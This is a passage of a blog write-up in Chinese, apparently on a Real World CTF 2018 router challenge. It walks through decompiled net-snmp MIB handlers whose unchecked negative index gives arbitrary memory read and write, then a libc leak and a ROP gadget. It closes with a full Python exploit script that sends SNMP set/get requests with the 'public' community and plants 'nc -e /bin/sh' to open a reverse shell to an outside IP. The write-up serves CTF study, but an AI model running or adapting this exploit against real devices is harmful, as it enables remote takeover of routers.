<span class="keyword">signed</span> <span class="keyword">int</span> *a3, _DWORD *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  v4 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( *a3 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( vla_str &lt;= <span class="number">29</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(mib_address + <span class="number">4</span> * vla_str) = **(_DWORD **)(*a4 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">    netsnmp_set_request_error();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a3 &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">160</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">      v6 = *a4;</span><br><span class="line">      <span class="keyword">if</span> ( vla_str &gt; <span class="number">29</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="number">7</span>;</span><br><span class="line">        v9 = <span class="number">4</span>;</span><br><span class="line">        v8 = <span class="string">"Go Back"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="number">4</span>;</span><br><span class="line">        v8 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(mib_address + <span class="number">4</span> * vla_str);</span><br><span class="line">        v9 = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      snmp_set_var_typed_value(v6, v9, (<span class="keyword">int</span>)v8, v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">      snmp_log(<span class="number">3</span>, <span class="string">"unknown mode (%d) in handle_greatMiscSensorsDevice\n"</span>, *a3);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = netsnmp_check_vb_type(*a4, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>handle_greatMiscSensorsIndex:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">handle_greatMiscSensorsIndex</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">signed</span> <span class="keyword">int</span> *a3, _DWORD *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v4 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( *a3 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    vla_str = **(_DWORD **)(*a4 + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a3 &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">0xA0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">      snmp_set_var_typed_value(*a4, <span class="number">2</span>, (<span class="keyword">int</span>)&amp;vla_str, <span class="number">4</span>);<span class="comment">// (netsnmp_variable_list *newvar, u_char type, const void *val_str, size_t val_len)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">      snmp_log(<span class="number">3</span>, <span class="string">"unknown mode (%d) in handle_greatMiscSensorsDevice\n"</span>, *a3);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = netsnmp_check_vb_type(*a4, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    netsnmp_set_request_error();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到handle_greatMiscSensorsDevice中：<br>当使用snmpset写对象时，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#*a3从<span class="number">0</span>循环-&gt;<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3.</span>.....</span><br><span class="line">  <span class="keyword">if</span> ( *a3 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( vla_str &lt;= <span class="number">29</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(mib_address + <span class="number">4</span> * vla_str) = **(_DWORD **)(*a4 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>mid_address是在snmp服务启动mib初始化时在init_greatSensors中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result &#x3D; malloc(0x78u);</span><br><span class="line">mib_address &#x3D; (int)result;</span><br><span class="line">vla_str &#x3D; 0;</span><br></pre></td></tr></table></figure>
+<p>而val_str在handle_greatMiscSensorsIndex中可以进行设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vla_str &#x3D; **(_DWORD **)(*a4 + 16);</span><br></pre></td></tr></table></figure>
+<p>即我们对OID对象1.3.6.1.4.1.2021.13.32.1.0设置的值<br>所以当我们依次调用handle_greatMiscSensorsIndex进行设置vla_str，此值只需小于29(在这里设置为负数即可)，而后调用handle_greatMiscSensorsDevice即可实现任意地址写<br>任意地址读相同原理，当snmpget读取对象时，会调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#v8 &#x3D; (const char *)(mib_address + 4 * vla_str);</span><br><span class="line">#这里同样检测vla_str是否大于29，设置为负数即可</span><br><span class="line">snmp_set_var_typed_value(v6, v9, (int)v8, v7)</span><br></pre></td></tr></table></figure>
+<p>即会将对象的值设置我们构造地址处的值<br>而后取出对象value返回给snmpget完成任意地址读</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先需要leak libc<br>想到注册回调函数位置<br>利用任意地址读找到注册函数保存地址来leak libc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex(0x76F5F9F0-0x76F5F40c)&#x3D;0x5e4</span><br></pre></td></tr></table></figure>
+<p>而后再次利用handle来劫持程序流，即netsnmp_call_handler中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 &#x3D; (int (__fastcall *)(int *, int, int *, int))v8[3];</span><br><span class="line">if ( !v10 )</span><br><span class="line">        break;</span><br><span class="line">se_find_label_in_slist((int)&quot;agent_mode&quot;, *v6);</span><br><span class="line">result &#x3D; v10(v8, v9, v6, v7);</span><br><span class="line">v12 &#x3D; v8[2];</span><br></pre></td></tr></table></figure>
+<p>这时候只需要事先布置好一条ROP链，最后将handle改为我们的rop chain地址即可劫持程序流，最终达到RCE：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget  --binary .&#x2F;libc.so </span><br><span class="line">......</span><br><span class="line">0x000596bc : ldr r3, [pc, #0x3c] ; ldr r2, [pc, #0x3c] ; add r3, pc, r3 ; ldr r0, [pc, r2] ; ldr r3, [r3] ; blx r3</span><br><span class="line">......</span><br><span class="line">在这里可以先将r3，r2值分别设置为&amp;system function,&amp;shell</span><br><span class="line">修改handle并再次对snmp对象操作便可达到RCE</span><br><span class="line">#也可以选择其他ROP链，构造可以system(shell)即可</span><br></pre></td></tr></table></figure>
+<p>最终POC：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#针对我模拟的路由环境,具体情况可能需要修改偏移</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(ip,offset)</span>:</span></span><br><span class="line">   cmd1=<span class="string">"snmpset -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.1.0 i %s"</span> %(ip,offset/<span class="number">4</span>)</span><br><span class="line">   cmd2=<span class="string">"snmpget -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.2.0"</span>   %ip</span><br><span class="line">   os.system(cmd1)</span><br><span class="line">   p2=process(cmd2,shell=<span class="literal">True</span>)</span><br><span class="line">   p2.recvuntil(<span class="string">"INTEGER: "</span>)</span><br><span class="line">   leak=int(p2.recvuntil(<span class="string">"\n"</span>).strip())</span><br><span class="line">   p2.close()</span><br><span class="line">   <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(ip,offset,note)</span>:</span></span><br><span class="line">   cmd1=<span class="string">"snmpset -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.1.0 i %s"</span> %(ip,offset/<span class="number">4</span>)</span><br><span class="line">   cmd2=<span class="string">"snmpset -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.2.0 i %s"</span>  %(ip,note)</span><br><span class="line">   os.system(cmd1)</span><br><span class="line">   sleep(<span class="number">0.5</span>)</span><br><span class="line">   os.system(cmd2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip)</span>:</span></span><br><span class="line">   cmd=<span class="string">"snmpget -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.1.0"</span>   %ip</span><br><span class="line">   os.system(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#leak addr</span></span><br><span class="line">    handle_addr=read(ip,<span class="number">-0x5e4</span>)</span><br><span class="line">    mibso_base=handle_addr<span class="number">-0x818</span></span><br><span class="line">    libcso_base=handle_addr+<span class="number">0x507e8</span></span><br><span class="line">    log.info(<span class="string">"mibso_base="</span>+hex(mibso_base))</span><br><span class="line">    log.info(<span class="string">"libcso_base="</span>+hex(libcso_base))</span><br><span class="line">    system_addr=libcso_base+<span class="number">0x43210</span></span><br><span class="line">    ropchain_addr=libcso_base+<span class="number">0x596bc</span></span><br><span class="line">    r3_addr=libcso_base+<span class="number">0x80394</span></span><br><span class="line">    r2_addr=libcso_base+<span class="number">0x80398</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#build rop chain</span></span><br><span class="line">    base=mibso_base+<span class="number">0xd29f0</span></span><br><span class="line">    cmd_addr=libcso_base+<span class="number">0x80420</span></span><br><span class="line">    write(ip,r3_addr-base,system_addr)</span><br><span class="line">    write(ip,r2_addr-base,cmd_addr)</span><br><span class="line">    cmd=<span class="string">"nc -e /bin/sh 192.168.160.131 1234\x00"</span> <span class="comment">#the shell you want run in router</span></span><br><span class="line">    <span class="comment">#padding</span></span><br><span class="line">    cmd+=<span class="string">"1"</span></span><br><span class="line">    time=len(cmd)/<span class="number">4</span></span><br><span class="line">    cmd=cmd.ljust((time+<span class="number">1</span>)*<span class="number">4</span>,<span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(time):</span><br><span class="line">          write(ip,cmd_addr+i*<span class="number">4</span>-base,u32(cmd[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]))</span><br><span class="line">    write(ip,<span class="number">-0x5e4</span>,ropchain_addr)</span><br><span class="line">    get_shell(ip)</span><br></pre></td></tr></table></figure>
+<h2 id="Run-POC-amp-amp-Get-Shell"><a href="#Run-POC-amp-amp-Get-Shell" class="headerlink" title="Run POC&amp;&amp;Get Shell"></a>Run POC&amp;&amp;Get Shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python payload.py  router_ip</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-fe0dae425dc63bea.gif?imageMogr2/auto-orient/strip" alt="PWN"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文章首发先知社区：</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4578</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-Environment"><span class="toc-number">1.</span> <span class="toc-text">Building Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-R-W-at-Any-Address-in-MIB"><span class="toc-number">2.</span> <span class="toc-text">Find R&#x2F;W at Any Address in MIB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-POC-amp-amp-Get-Shell"><span class="toc-number">4.</span> <span class="toc-text">Run POC&amp;&amp;Get Shell</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&text=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&is_video=false&description=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Real World Finals 2018 Router&body=Check out this article: http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&title=Real World Finals 2018 Router" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/07/Real-World-Finals-2018-Router/&name=Real World Finals 2018 Router&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
